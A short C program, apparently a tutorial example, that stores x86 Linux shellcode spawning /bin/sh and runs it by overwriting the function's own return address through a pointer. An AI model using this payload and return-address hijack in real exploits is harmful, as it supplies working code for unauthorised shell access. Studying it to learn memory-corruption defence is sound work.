// #include<stdio.h> we will not be needing this as we are not using any functions from the C library...Just basic logic of Pointers.. 

char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() 
{ 
int *ret; // a simple integer pointer pointing a address 
ret = (int *)&ret + 2; // change the address pointed by 
(*ret) = (int)shellcode; 

}
